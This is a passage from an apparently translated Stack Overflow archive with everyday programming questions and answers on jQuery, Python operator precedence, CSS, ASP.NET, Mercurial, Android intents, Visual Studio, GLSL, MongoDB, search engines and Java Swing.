**底层 jQuery 这是不工作的部分（甚至不点击）**

```
//Spend Category function for monthly
        pa_click = function (pa_label) {
            PA_ID = pa_label.getAttribute('pa_id');

        var pa_details = document.getElementById('pa-details-' + PA_ID);
        alert('message');
        jQuery.getJSON('@Url.Action("getAjaxSCs")', { PA: pa_label.title }, function (SCS) {
            pa_details.innerHTML = "";
            jQuery.each(SCS, function (index, SC) {
                months_html = '';
                for (var i = 0; i < 12; i++) {
                    months_html +=
                                        '<div id="SC-' + SC.SPEND_CATEGORY + '-' + months[i] + '" class="month-wrapper tree border-white">' +
                                        months[i] +
                                        '</div>';
                }

                pa_details.innerHTML +=
                alert('message');
                        '<div id ="Spend-Category-' + SC.SPEND_CATEGORY + '" class="sc-wrapper tree border">' +
                            '<div id ="sc-title-' + SC.SPEND_CATEGORY + '" class="sc-title">' +
                                '<div class = "sc-label" title = "' + SC.SPEND_CATEGORY + '" SC_id="' + SC.SPEND_CATEGORY + '" onclick = "sc_click(this)">' + SC.SPEND_CATEGORY + '</div>' +
                                months_html +
                            '</div>' +
                            '<div id="sc-details-' + SC.SPEND_CATEGORY + '" class = "pa-details" style = "display:none">' + SC.SPEND_CATEGORY + '</div>' +
                        '</div>';
            })
        });
        jQuery('#pa-details-' + PA_ID).show('slide', { direction: 'up' }, 'fast');

    }; 
```

**整个 jQuery**

```
<script type="text/javascript">
    jQuery(document).ready(function ($) {
        var IA_ID = 0;
        var months = new Array("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec");

        // Major Program function for monthly
        $(".ia-label").click(function () {

            IA_ID = this.getAttribute('investment_area_id');
            var ia_details = document.getElementById('ia-details-' + IA_ID);

            jQuery.getJSON('@Url.Action("getAjaxMPs")', { IA: this.title }, function (MPS) {
                ia_details.innerHTML = "";
                jQuery.each(MPS, function (index, MP) {
                    months_html = '';
                    for (var i = 0; i < 12; i++) {
                        months_html +=
                                            '<div id="MP-' + MP.MP_ID + '-' + months[i] + '" class="month-wrapper tree border-white">' +
                                            months[i] +
                                            '</div>';
                    }

                    ia_details.innerHTML +=
                            '<div id="MP-' + MP.MP_ID + '" class="mp-wrapper tree border">' +
                                '<div id="mp-title-' + MP.MP_ID + '" class="mp-title">' +
                                    '<div class="mp-label" title="' + MP.MP_NAME + '" major_program_id="' + MP.MP_ID + '" onclick="mp_click(this)">' + MP.MP_NAME + '</div>' +
                                    months_html +
                                '</div>' +
                                '<div id="mp-details-' + MP.MP_ID + '" class="mp-details" style="display:none">' + MP.MP_NAME + '</div>' +
                            '</div>';

                })
            });
            jQuery('#ia-details-' + IA_ID).show('slide', { direction: 'up' }, 'fast');

        });
        //Sub Program function for monthly
        mp_click = function (mp_label) {
            MP_ID = mp_label.getAttribute('major_program_id');
            var mp_details = document.getElementById('mp-details-' + MP_ID);

            jQuery.getJSON('@Url.Action("getAjaxSPs")', { MP: mp_label.title }, function (SPS) {
                mp_details.innerHTML = "";
                jQuery.each(SPS, function (index, SP) {
                    months_html = '';
                    for (var i = 0; i < 12; i++) {
                        months_html +=
                                            '<div id="SP-' + SP.SP_ID + '-' + months[i] + '" class="month-wrapper tree border-white">' +
                                            months[i] +
                                            '</div>';
                    }

                    mp_details.innerHTML +=
                            '<div id ="Sub-Program-' + SP.SP_ID + '" class="sp-wrapper tree border">' +
                                '<div id ="sp-title-' + SP.SP_ID + '" class="sp-title">' +
                                    '<div class = "sp-label" title = "' + SP.SP_NAME + '" sub_program_id="' + SP.SP_ID + '" onclick="sp_click(this)">' + SP.SP_NAME + '</div>' +
                                    months_html +
                                '</div>' +
                                '<div id="sp-details-' + SP.SP_ID + '" class = "mp-details" style = "display:none">' + SP.SP_NAME + '</div>' +
                            '</div>';
                })
            });
            jQuery('#mp-details-' + MP_ID).show('slide', { direction: 'up' }, 'fast');

        };

        //PA function for monthly
        sp_click = function (sp_label) {
            SP_ID = sp_label.getAttribute('sub_program_id');
            var sp_details = document.getElementById('sp-details-' + SP_ID);

            jQuery.getJSON('@Url.Action("getAjaxPAs")', { SP: sp_label.title }, function (PAS) {
                sp_details.innerHTML = "";
                jQuery.each(PAS, function (index, PA) {
                    months_html = '';
                    for (var i = 0; i < 12; i++) {
                        months_html +=
                                            '<div id="PA-' + PA.PA + '-' + months[i] + '" class="month-wrapper tree border-white">' +
                                            months[i] +
                                            '</div>';
                    }

                    sp_details.innerHTML +=

                            '<div id ="PA-' + PA.PA + '" class="sp-wrapper tree border">' +
                                '<div id ="pa-title-' + PA.PA + '" class="pa-title">' +
                                    '<div class = "pa-label" title = "' + PA.PA + '" PA_id="' + PA.PA + '" onlclick = "pa_click(this)">' + PA.PA + '</div>' +
                                    months_html +
                                '</div>' +
                                '<div id="pa-details-' + PA.PA + '" class = "sp-details" style = "display:none">' + PA.PA + '</div>' +
                            '</div>';
                })
            });
            jQuery('#sp-details-' + SP_ID).show('slide', { direction: 'up' }, 'fast');

        };

        //Spend Category function for monthly
        pa_click = function (pa_label) {
            PA_ID = pa_label.getAttribute('pa_id');

            var pa_details = document.getElementById('pa-details-' + PA_ID);
            alert('message');
            jQuery.getJSON('@Url.Action("getAjaxSCs")', { PA: pa_label.title }, function (SCS) {
                pa_details.innerHTML = "";
                jQuery.each(SCS, function (index, SC) {
                    months_html = '';
                    for (var i = 0; i < 12; i++) {
                        months_html +=
                                            '<div id="SC-' + SC.SPEND_CATEGORY + '-' + months[i] + '" class="month-wrapper tree border-white">' +
                                            months[i] +
                                            '</div>';
                    }

                    pa_details.innerHTML +=
                    alert('message');
                            '<div id ="Spend-Category-' + SC.SPEND_CATEGORY + '" class="sc-wrapper tree border">' +
                                '<div id ="sc-title-' + SC.SPEND_CATEGORY + '" class="sc-title">' +
                                    '<div class = "sc-label" title = "' + SC.SPEND_CATEGORY + '" SC_id="' + SC.SPEND_CATEGORY + '" onclick = "sc_click(this)">' + SC.SPEND_CATEGORY + '</div>' +
                                    months_html +
                                '</div>' +
                                '<div id="sc-details-' + SC.SPEND_CATEGORY + '" class = "pa-details" style = "display:none">' + SC.SPEND_CATEGORY + '</div>' +
                            '</div>';
                })
            });
            jQuery('#pa-details-' + PA_ID).show('slide', { direction: 'up' }, 'fast');

        };

    });
</script> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T14:12:30.233

`'<div class = "pa-label" title = "' + PA.PA + '" PA_id="' + PA.PA + '" onlclick = "pa_click(this)">' + PA.PA`

你拼错了`onclick`，那应该解决它！

附带说明：为这种情况创建一个实时 DOM 事件处理程序更容易且性能更好。添加如此多的 onclick 事件（尤其是在 IE 中，会在每个项目上创建大量的脚本事件（最终都是相同的））！

做就是了：

```
$(document).on('click', '.pa-label', function (e) { 
    pa_click(this);
}); 
```

# python - Python - 好奇/意外的行为 - 运算符的优先级

> ID：11847848
> 
> 赞同：7
> 
> 时间：2012-08-07T14:10:12.013
> 
> 标签：python, operator-precedence

我最近一直在尝试使用 python 生成器，我遇到了以下奇怪的行为，我很想了解为什么会发生这种情况以及发生了什么：

```
def generating_test(n): 
    for a in range(n): 
        yield "a squared is %s" % a*a # Notice instead of a**2 we have written a*a

for asquare in generating_test(3): 
    print asquare 
```

输出：

```
a squared is 1
a squared is 2a squared is 2 
```

与生成预期输出的以下脚本相比：

```
def generating_test(n): 
    for a in range(n): 
        yield "a squared is %s" % a**2 # we use the correct a**2 here

for asquare in generating_test(3): 
    print asquare 
```

输出：

```
a squared is 0
a squared is 1
a squared is 4 
```

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-08-07T14:12:19.940

这与生成器没有任何关系：

```
>>> a = 2
>>> "a squared is %s" % a
'a squared is 2'
>>> ("a squared is %s" % a)*a
'a squared is 2a squared is 2'
>>> "a squared is %s" % a*a
'a squared is 2a squared is 2'
>>> "a squared is %s" % (a*a)
'a squared is 4' 
```

运算在`%`乘法之前执行，使用字符串和第一个`a`作为参数。您的`a**2`作品是因为`**`带有`a`和`2`作为参数的操作在`%`.

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-07T14:21:29.633

[Python 的操作顺序](http://docs.python.org/reference/expressions.html#evaluation-order)是从左到右，除了 PEMDAS 应用的地方。字符串插值运算符显然与模和乘法具有相同的优先级，因为如果您颠倒顺序，使插值左侧的乘法，它优先：

```
>>> print 3 * "a foo %s" % 'hi'
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: not enough arguments for format string
>>> print 3 * "a foo %s" % ('hi', 'ho', 'yo')
a foo hia foo hoa foo yo 
```

但是，正如您所展示的，求幂胜过从左到右的顺序。

更新：在[二元算术运算下的同一文档](http://docs.python.org/reference/expressions.html#binary-arithmetic-operations)中，它说明了一些明显的含义，但内涵相关：

> …% 运算符也被字符串和 unicode 对象重载以执行字符串格式化（也称为插值）。

虽然这似乎只是告诉您`%`运算符的*作用*，但我认为它的位置和上下文也告诉您它具有相同的优先级，无论它是用作*modulo*还是*interpolate*。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-08-07T14:34:15.443

当您观察到意外行为时，请通过将其提炼为最简单的情况来开始您的分析。一个简单的案例会更容易学习和理解。

意外的行为：

```
>>> 'hello %s' % 3 * 2
'hello 3hello 3' 
```

（你预期`'hello 6'`）

* * *

我们认为 Python 必须将命令解释为`'hello 3' * 2`而不是`'hello %d' % 6`. 我们尝试用括号强制第二种解释

```
>>> "hello %s" % (3*2)
'hello 6' 
```

尤里卡！

我们已经证明字符串格式化运算符`%`的优先级高于或等于乘法。我们检查了 Python 文档——是的，它证实了这个 [http://docs.python.org/reference/expressions.html#summary](http://docs.python.org/reference/expressions.html#summary)

为了确认优先级相等，我们可以反过来尝试：

```
>>> "%d,"*2%(1,2)
'1,2,' 
```

看到逗号 (,) 是重复的，我们推断乘法`"%d," * 2`是在字符串格式化之前执行的`%`。如果乘法可以先于字符串格式化，并且字符串格式化先于乘法，则它们的优先级必须相等。

# css - 有没有办法打破css中这种继承的填充？

> ID：11847855
> 
> 赞同：1
> 
> 时间：2012-08-07T14:10:33.767
> 
> 标签：css

我有这个 HTML：

```
<ul>
  <li>content <span>more</span></li>
</ul> 
```

这是我的CSS：

```
li{
  padding: 30px;
}

span{
  padding-top: -20px;
} 
```

上的填充`span`不生效。我可以通过更改 HTML 来解决它，但是现在我遇到了这个问题，我想了解是否有解决方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T14:12:12.510

`padding-top`在内联元素上不起作用！使用块元素或 set `span { display:block }`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T14:16:09.203

设置`<span>`为`{display:inline-block}`

# .net - 网格视图中的可选复选框

> ID：11847856
> 
> 赞同：0
> 
> 时间：2012-08-07T14:10:42.223
> 
> 标签：.net, datagridviewcheckboxcell

VS2010.net

我有一个显示来自数据库的信息的网格视图。其中一个字段是复选框。我想要做的是能够单击复选框并将其更新回数据库，但复选框字段是灰色的。下面是我的标记。搜索使复选框可点击不会返回任何有用的结果。

```
<asp:GridView ID="gvSiteInfo" runat="server" BackColor="White" 
    GridLines="Vertical" AutoGenerateColumns="False" OnSorting="gvSiteInfo_Sorting" 
    onselectedindexchanged="gvSiteInfo_SelectedIndexChanged" 
    AllowSorting="True">
    <Columns>
        <asp:BoundField DataField="prodServer" HeaderText="Production Server" 
            SortExpression="prodServer" />
        <asp:BoundField DataField="prodHostHeader" HeaderText="Production Host Header" 
            SortExpression="prodHostHeader" />
        <asp:BoundField DataField="prodIP" HeaderText="Production IP Address" 
            SortExpression="prodIP" />
        <asp:CheckBoxField DataField="testComplete" HeaderText="Testing Completed" 
            SortExpression="testComplete" />
    </Columns>
</asp:GridView> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:16:18.313

您应该使用`templatefield`：

```
 <asp:TemplateField>
                            <ItemTemplate>
                                <asp:CheckBox ID="chkSelector" runat="server"
                                    ToolTip="Select row?" />
                            </ItemTemplate>
                        </asp:TemplateField> 
```

您似乎也没有根据数据库设置值：

```
Checked='<%# DataBinder.Eval(Container, "DataItem.IsChecked") %>' 
```

# mercurial - HTTP 错误 502：推送到 bitbucket 时出现错误网关

> ID：11847857
> 
> 赞同：2
> 
> 时间：2012-08-07T14:10:44.070
> 
> 标签：mercurial, push, bitbucket

我有一个 mercurial 存储库，当我尝试将更改推送到 bitbucket 时，我突然收到错误消息

```
HTTP Error 502: Bad Gateway 
```

经过长时间的等待（搜索更改..）

任何的想法？这让我难过了两天！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T15:09:16.380

有些人在尝试使用 HTTP 协议推送大的变更集时报告了类似的问题。尝试改用 SSH。[您可以在此处](https://confluence.atlassian.com/bitbucket/set-up-an-ssh-key-728138079.html)找到有关 Bitbucket 的说明。

# android - 从安卓浏览器安装应用

> ID：11847863
> 
> 赞同：0
> 
> 时间：2012-08-07T14:10:48.330
> 
> 标签：android, android-intent

我创建了一个应用程序，它从 sd 卡上的 apk 文件安装另一个应用程序：

```
File fullPath = new File(Environment.getExternalStorageDirectory() + "/test_intent_target.apk");

Intent intent = new Intent(Intent.ACTION_VIEW);
Uri uri = Uri.fromFile(fullPath);
intent.setDataAndType(uri, "application/vnd.android.package-archive");

startActivity(intent); 
```

然后我使用 log 将意图作为字符串获取：

```
Log.d("my intent", intent.toUri(Intent.URI_INTENT_SCHEME)); 
```

产生：

```
intent:///mnt/sdcard/test_intent_target.apk#Intent;scheme=file;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end 
```

我现在想在启动该意图的 Web 浏览器中创建一个链接。我试过了：

```
<a href="intent:///mnt/sdcard/test_intent_target.apk#Intent;scheme=file;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end">Install App</a> 
```

但是网络浏览器只是返回页面不可用。我不断看到人们使用的例子，`<a href="intent:#Intent;etc;etc;end>`但它似乎对我不起作用，我不确定我做错了什么。任何帮助或线索将不胜感激

谢谢，

詹姆士

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:34:43.673

`<a href="file:///mnt/sdcard/....">`另外，不确定您是否需要 .apk 之后的部分。

# visual-studio - 为什么我的配置管理器在 Visual Studio 中为空白？

> ID：11847866
> 
> 赞同：6
> 
> 时间：2012-08-07T14:10:58.970
> 
> 标签：visual-studio, configuration, solution

最近，在我一直在研究的一些解决方案中，配置管理器对话框显示“配置”和“平台”的空白字段，并且始终未选中“构建”。更改值并保存配置并不能解决问题。

并非所有解决方案都会发生这种情况（例如，在创建新解决方案时，不会出现此问题）。为什么会发生这种情况，我该如何解决？

屏幕截图（审查项目名称）： ![配置管理器](../Images/0dea4da497b3d00860d2d137c51b69f9.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-29T10:32:26.107

I have experienced the same problem (adding an Oracle Database project to my solution).

To fix the problem you should edit the solution file (.sln). Find the Oracle Database project (search for oradbproj). You should find something like this:

```
Project("{218574D1-FF94-4B95-8577-A6D58C11C315}") = "MyOracleDatabase", 
"MyOracleDatabase\MyOracleDatabase.oradbproj", "{41823BBF-36F6-42AC-9C41-119241BAAFEC}"
    EndProject 
```

Later, in the same .sln file search for the begining of the section **"GlobalSection(ProjectConfigurationPlatforms) = postSolution"**. There would be many entries like these:

```
{CE85B8BD-1BCF-468C-AA0B-B869B87A66D5}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
{CE85B8BD-1BCF-468C-AA0B-B869B87A66D5}.Debug|Any CPU.Build.0 = Debug|Any CPU
{CE85B8BD-1BCF-468C-AA0B-B869B87A66D5}.Release|Any CPU.ActiveCfg = Release|Any CPU
{CE85B8BD-1BCF-468C-AA0B-B869B87A66D5}.Release|Any CPU.Build.0 = Release|Any CPU 
```

Copy them an replace the GUID with the second one in the previos "oradbproj" line **({41823BBF-36F6-42AC-9C41-119241BAAFEC}** in the previous example):

```
{CE85B8BD-1BCF-468C-AA0B-B869B87A66D5}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
{CE85B8BD-1BCF-468C-AA0B-B869B87A66D5}.Debug|Any CPU.Build.0 = Debug|Any CPU
{CE85B8BD-1BCF-468C-AA0B-B869B87A66D5}.Release|Any CPU.ActiveCfg = Release|Any CPU
{CE85B8BD-1BCF-468C-AA0B-B869B87A66D5}.Release|Any CPU.Build.0 = Release|Any CPU
{41823BBF-36F6-42AC-9C41-119241BAAFEC}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
{41823BBF-36F6-42AC-9C41-119241BAAFEC}.Debug|Any CPU.Build.0 = Debug|Any CPU
{41823BBF-36F6-42AC-9C41-119241BAAFEC}.Release|Any CPU.ActiveCfg = Release|Any CPU
{41823BBF-36F6-42AC-9C41-119241BAAFEC}.Release|Any CPU.Build.0 = Release|Any CPU 
```

Now you can save the .sln file. If you edited the .sln file from outside the Visual Studio having it opened, coming back to Visual Studio it would prompt to reload the solution. Click Yes and wait. That is!!!

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-07T17:46:48.517

在深入研究它比我想承认的时间更长之后，我发现罪魁祸首是一个 Oracle 数据库项目 (.oradbproj)。显然，当它被添加到解决方案时，Visual Studio 并没有在解决方案配置和数据库项目的项目配置之间创建映射。手动添加映射似乎可以解决问题。我从另一个项目（在解决方案文件的 ProjectConfigurationPlatforms 部分）复制了映射，然后将 GUID 替换为与数据库项目对应的 GUID。进行更改、保存并重新打开解决方案后，一切看起来都很好！

# ios - 如何使用 GLSL 在没有 alpha 混合的情况下组合两个纹理

> ID：11847868
> 
> 赞同：3
> 
> 时间：2012-08-07T14:11:00.967
> 
> 标签：ios, opengl-es, opengl-es-2.0, glsl, multitexturing

我正在尝试在 opengl es 2.0 中使用着色器组合两个纹理

![在此处输入图像描述](../Images/dbebe3b27e1cb6d46163f07542fb5538.png)

正如您在屏幕截图中看到的那样，我正在尝试使用动态环境映射在后向对象上创建针反射。但是，针的反射看起来是半透明的，并且与我的环境贴图融为一体。

这是我的片段着色器；

```
varying highp vec4 R;

uniform samplerCube cube_map1;
uniform samplerCube cube_map2;

void main()
{
    mediump vec3 output_color1;
    mediump vec3 output_color2;

    output_color1 = textureCube(cube_map1 , R.xyz).rgb;
    output_color2 = textureCube(cube_map2 , R.xyz).rgb;

    gl_FragColor = mix(vec4(output_color1,1.0),vec4(output_color2,1.0),0.5);  
} 
```

但是，“混合”方法会导致混合两种纹理。

我还检查了[纹理组合器](http://www.opengl.org/wiki/Texture_Combiners#Example_:_Add_tex0_and_tex1)示例，但它也没有帮助。

有什么方法可以结合两种纹理而不相互混合。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:56:58.323

从评论来看，我猜你想在风景画上画针。我只是将其渲染为叠加层，但由于您想在着色器中执行此操作，因此可能会起作用：

```
void main()
{
    mediump vec3 output_color1;
    mediump vec3 output_color2;

    output_color1 = textureCube(cube_map1 , R.xyz).rgb;
    output_color2 = textureCube(cube_map2 , R.xyz).rgb;

    if ( length( output_color1 ) > 0.0 )
         gl_FragColor = vec4(output_color1,1.0);
    else 
         gl_FragColor = vec4(output_color2,1.0);
} 
```

# jquery - 使用 AJAX 的颜色框出现问题

> ID：11847870
> 
> 赞同：1
> 
> 时间：2012-08-07T14:11:12.540
> 
> 标签：jquery, ajax, colorbox

当我通过 AJAX 加载内容时，我遇到了颜色框问题。我使用从文档中给出的普通代码：

```
 $(document).ready(function(){
        $(".lightbox").colorbox();
     }); 
```

它在此页面上有效：

[http://www.mdlab.com/executive-personnel/](http://www.mdlab.com/executive-personnel/)

但不是当我从 AJAX 加载内容时（红色圆圈）：

![在此处输入图像描述](../Images/556c49247747634d43e6d51712b2c8c3.png) [http://www.mdlab.com/testing-menu/](http://www.mdlab.com/testing-menu/)

我真的很难过，这是我第一次尝试彩盒，所以任何帮助都是有帮助的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:20:14.837

问题是，该网页已经“准备就绪”，ajax 请求是小的单个请求，$(document) 对象不知道它们。添加

```
$(".lightbox").colorbox(); 
```

进入 showTestList.js 到第 23 行，您在其中处理响应。

帮助不大：寻找 jQuery.ajax 函数 :)

# mongodb - mongo db查询非常慢，即使它命中索引并且没有scanAndOrder

> ID：11847877
> 
> 赞同：1
> 
> 时间：2012-08-07T14:11:30.280
> 
> 标签：mongodb, indexing

MongoDB版本是2.0。

我有这样的结构集合：

```
 {
  "_id" : ObjectId("4fc1225eec13839b46f400e4"),
   "wb" : {
    "trip_plan" : [{
         "op_sta" : "242H",
         "in_tm" : ISODate("2012-07-30T018:00:00Z"),
         "out_tm" : ISODate("2012-07-30T19:02:00Z"),
      }, {
         "op_sta" : "10563",
         "in_tm" : ISODate("2012-07-30T20:00:00Z"),
         "out_tm" : ISODate("2012-07-30T21:00:00Z") 
       }, {
         "op_sta" : "10451",
        "in_tm" : ISODate("2012-07-31T06:00:00Z"),
        "out_tm" : ISODate("2012-07-31T08:00:00Z"),
      }]
  }
} 
```

trip_plan arr 很大。平均长度约为30-40。但我无法在 2.0 版中获得仅匹配的记录。我的应用程序是一种编写繁重的应用程序。

收集统计信息，例如：

```
 {
    "ns" : "itcp.car_location",
    "count" : 476509,
    "size" : 11794651412,
    "avgObjSize" : 24752.21121112088,
    "storageSize" : 13324562416,
    "numExtents" : 34,
    "nindexes" : 17,
    "lastExtentSize" : 2146426864,
    "paddingFactor" : 1.009999999878954,
    "flags" : 0,
    "totalIndexSize" : 2178233568,
    "indexSizes" : {
        "_id_" : 22418592,
        "wb.wb_sn_1" : 19516112,
        "next_wb.wb_sn_1" : 7914368,
        "wb.trip_plan.op_sta_1_wb.trip_plan.in_trn_1_wb.trip_plan.in_orgn_dt_1" : 315757120,
        "next_wb.trip_plan.op_sta_1_next_wb.trip_plan.in_trn_1_next_wb.trip_plan.in_orgn_dt_1" : 84065632,
        "wb.trip_plan.op_sta_1_wb.trip_plan.out_trn_1_wb.trip_plan.out_orgn_dt_1" : 319387264,
        "next_wb.trip_plan.op_sta_1_next_wb.trip_plan.out_trn_1_next_wb.trip_plan.out_orgn_dt_1" : 95487504,
        "last_op-last_evt_type-status"" : 30758112,
        "modify_ts" : 22091552,
        "ActlInTrn" : 245263648,
        "ActlOutTrn" : 243301408,
        "eq_nr_init" : 23105376,
        "event_os_trn_orgnDt" : 97719552,
        "wb_ibTrn_os_ts" : 255475472,
        "wb_obTrn_os_ts" : 243056128,
        "next_wb_ibTrn_os_ts" : 76658176,
        "next_wb_ObTrn_os_ts" : 76257552
    },
    "ok" : 1
} 
```

我的索引是这样的：

```
wb_obTrn_os_ts       
{
"wb.trip_plan.op_sta" : 1,
"wb.trip_plan.out_tm":1
} 
```

当我通过以下方式进行查询时

```
 db.car_location.find({ "wb.trip_plan": {$elemMatch: {"op_sta" :"148H",  
        "out_tm" : {$gt: ISODate("2012-08-02T04:00:00.000Z"),       
        $lt: ISODate("2012-08-03T04:00:00.000Z")}}}} ).explain();
... ... {
    "cursor" : "BtreeCursor wb_obTrn_os_ts",
    "nscanned" : 45624,
    "nscannedObjects" : 45624,
    "n" : 2889,
    "millis" : 378954,
    "nYields" : 3858,
    "nChunkSkips" : 0,
    "isMultiKey" : true,
    "indexOnly" : false,
    "indexBounds" : {
        "wb.trip_plan.op_sta" : [
            [
                "148H",
                "148H"
            ]
        ],
        "wb.trip_plan.out_tm" : [
            [
                {
                    "$minElement" : 1
                },
                {
                    "$maxElement" : 1
                }
            ]
        ]
    }
} 
```

我的 mongodb 服务器 RAM 是 16G 。从解释中，您可以看到它已命中索引并且没有 scanAndOrder。需要很长时间才能得到结果！！我已经被这个问题阻止了好几天了！！

非常感谢您的救援！！

```
insert  query update delete getmore command flushes mapped  vsize    res faults locked % idx miss %     qr|qw   ar|aw  netIn netOut  conn            set repl       time
     1     50     26      0       6      48       0  76.3g   154g  11.9g    223     15.3          0       8|3     9|3   147k   525k    74 abc2g_repl_set    M   11:48:33
     0     57     40      0       3      44       0  76.3g   154g  11.9g    158     12.4          0       6|4     8|4   101k   624k    74 abc2g_repl_set    M   11:48:34
     0     43     30      0       2      36       0  76.3g   154g  11.9g     84     13.2          0       5|1     7|1    93k   442k    74 abc2g_repl_set    M   11:48:35
     0      5      6      0       6      17       0  76.3g   154g    12g    281      2.4          0       1|1     6|0    13k    63k    74 abc2g_repl_set    M   11:48:36
     0     38      9      0       7       8       0  76.3g   154g  12.1g    256      2.1          0       0|0     5|0    41k   183k    74 abc2g_repl_set    M   11:48:37
     0     44      0      0       0      29       0  76.3g   154g  12.1g    359        0          0       0|0     5|0     5k   208k    74 abc2g_repl_set    M   11:48:38
     0     17      0      0       0       1       0  76.3g   154g  12.1g    316        0          0       0|0     6|0     1k    74k    74 abc2g_repl_set    M   11:48:39
     0     27      3      0       2      11       0  76.3g   154g  12.2g    225      0.3          0       3|0     5|0    12k   161k    74 abc2g_repl_set    M   11:48:40
     0     29      5      0       4      11       0  76.3g   154g  12.2g    275      3.2          0       0|0     5|0    24k   251k    74 abc2g_repl_set    M   11:48:41
     0     42      7      0       6      27       0  76.3g   154g  12.2g    197     12.4          0       0|0     5|0    14k   245k    74 abc2g_repl_set    M   11:48:42 
```

我应该注意哪部分信息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-09T06:47:22.123

这里有几个快速查询/尝试你可以做

1.  你真的想要$elemMatch吗？（你最了解它的结构！）
2.  你可以试试聚合吗？当 $ 和 $elemMatch 在两个不同的字段（在复杂查询中）时，Mongodb 查询优化器的行为很奇怪。您可以尝试将这两个操作流水线化，它会非常快（至少在我的大多数查询中，类似类型！）

# jquery - Cookie 名称中的变量

> ID：11847886
> 
> 赞同：0
> 
> 时间：2012-08-07T14:11:49.733
> 
> 标签：jquery, cookies

我尝试在 cookie 名称中插入一个变量

```
jQuery.cookie("box'+ variablename +'","open", {expires: 365}); 
```

我在这里做错了什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-07T14:15:13.527

```
jQuery.cookie("box"+ variablename ,"open", {expires: 365}); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-07T14:13:47.553

您忘记了 a`"`之前和之后的a `+`。

```
jQuery.cookie("box'"+ variablename + "'","open", {expires: 365});
//-----------------^-----------------^ 
```

你真的想要`'`字符串的内部吗？你可能不知道。在这种情况下，失去`'`s。

```
jQuery.cookie("box"+ variablename, "open", {expires: 365}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T14:16:02.013

您尝试保存的 cookie 的名称将如下所示

```
box'VariableName' 
```

删除单括号。

# database - 分面搜索：ElasticSearch/Solr 还是简单的数据库查询？

> ID：11847890
> 
> 赞同：1
> 
> 时间：2012-08-07T14:11:55.273
> 
> 标签：database, search, solr, elasticsearch

原谅这个超级基本的问题，来自一个搜索新手。

我想实现一个使用分面搜索的网站。例如，它是一个带有酒店数据库的网站，我希望允许用户搜索价格范围内的酒店，有游泳池，三星级或四星级。

显然，我可以通过简单的数据库查询将结果返回给用户。

我应该使用 ElasticSearch 或 Solr 来实现它而不是使用数据库查询吗？如果是这样，为什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-07T20:11:45.847

是的，您应该使用 ES 或 Solr。原因：主要是性能和轻松更改（想想配置）“刻面类型”的能力。

刻面是一项不小的壮举，尽管您可以使用 RDBMS 来完成，但要快速完成需要经过深思熟虑。如果您可以使用 Solr / ES (+ Lucene) 团队为优化它所花费的大量时间，为什么还要自己做呢。

至于我提到的“刻面类型”：

1.  也许你想做分层刻面。选择价格类别 > 显示较小的价格类别。如何分桶：固定范围、均匀分布等。 Solr / ES 从配置中提供这些选项。
2.  也许您可以使用带有最小/最大句柄的滑块来实现价格分面？滑动时是否要显示酒店的 nr（直方图/Solr / ES 中的 facetstats）
3.  虽然您已经了解价格，但也许您仍然想知道价格滑块的最小值和最大值，就好像您没有过滤价格一样。如果您希望能够按比例绘制滑块手柄，则需要这样做。（作为考虑从 Solr 切换到 ES 的一部分，请参阅我关于 SO 的问题：[Elasticsearch: exclude filters while faceting possible?（就像在 Solr 中一样](https://stackoverflow.com/questions/8908325/elasticsearch-excluding-filters-while-faceting-possible-like-in-solr)）
4.  面对星星？如果用户选择该星（再次直方图/统计数据），也许您想显示每个星面的最佳价格

说真的，甚至不要考虑使用 RDBMS 进行上述操作。你会发疯的。

希望对您有所帮助，是的，我熟悉该领域:)

其他问题，尽管问。

# java - 如何将 JTable 的内容保存（和读取）到文件中？

> ID：11847891
> 
> 赞同：-2
> 
> 时间：2012-08-07T14:11:55.677
> 
> 标签：java, file, io, jtable

相对不言自明，我有一个`JTable (table)`和`DefaultTableModel (model)`. 我想将**JTable**的内容保存到文件中，然后稍后将它们读入**JTable**。我怎样才能做到这一点？

更多详细信息：JTable 包含短字符串，数据总量不应超过 50KB。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T14:16:58.487

`DefaultTableModel`实现可序列化。所以最简单的解决方案是使用`ObjectOutputStream`和调用`writeObject()`你的模型。

**注意：**请记住，`DefaultDataModel`需要持有的对象`Serialazable`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T14:14:57.687

嗯，这个决定有几个因素。主要是数据有多大，以及数据被读/写的频率

我脑海中浮现的一些想法是将数据存储到 1-XML 文件中，最简单的方法是使用内置的 dom

[http://www.roseindia.net/xml/dom/](http://www.roseindia.net/xml/dom/)

2-数据库我个人比较喜欢mysql。它易于使用。Java 提供了一组很棒的 sql 函数 [http://dev.mysql.com/usingmysql/java/](http://dev.mysql.com/usingmysql/java/) http://zetcode.com/databases/mysqljavatutorial/

如果您有大量数据，或者您需要随机访问表中的元素，那么除了这些简单的解决方案之外，还有更多需要考虑的事情

问候

# redis - 如何处理 Redis 客户端中的 read() 超时？

> ID：11847900
> 
